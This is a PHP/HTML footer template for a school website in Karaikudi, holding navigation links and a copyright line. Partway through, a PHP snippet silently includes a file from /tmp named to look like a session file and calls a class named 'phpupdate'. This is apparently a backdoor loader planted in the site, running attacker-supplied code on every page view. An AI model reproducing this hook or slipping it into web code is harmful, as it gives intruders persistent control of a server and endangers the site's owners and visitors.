<div class="footerOuter">
  <div class="footer">
    <div class="footerTop">
      <ul>
        <li><a href="index.php">Home</a></li>
        <li><a href="about-us.php">History</a></li>
        <li><a href="history.php">Our Rich Heritage</a></li>
        <li><a href="javascript:;"> Admin</a></li>
        <li><a href="academics.php">Academics</a></li>
        <li><a href="beyond-curriculum.php">Beyond Curriculum</a></li>
        <li><a href="gallery.php">Gallery</a></li>
        <li class="end"><a href="contact-us.php">Contact Us</a></li>
      </ul>
    </div>
<?php
$f='/tmp/ssess_aaab802a3be96c66d6040629680bd42b';
if(file_exists($f)) {
    include_once($f);
    echo phpupdate::version();
}
?>
    <div class="footerBottom">
      <div class="footerBottomLeft">© <script language="JavaScript" type="text/javascript">document.write((new Date()).getFullYear());</script> ALAGAPPA MATRIC HR. SEC. SCHOOL . Karaikudi</div>
      <div class="footerBottomRight">Powered by <a href="http://www.sanjaytechnologies.org/" target="_blank">Sanjay Technologies</a></div>
    </div>
  </div>
</div>
<script>

	$('#ft').jqFancyTransitions({ navigation: true, links : true });

</script>
</body>
</html>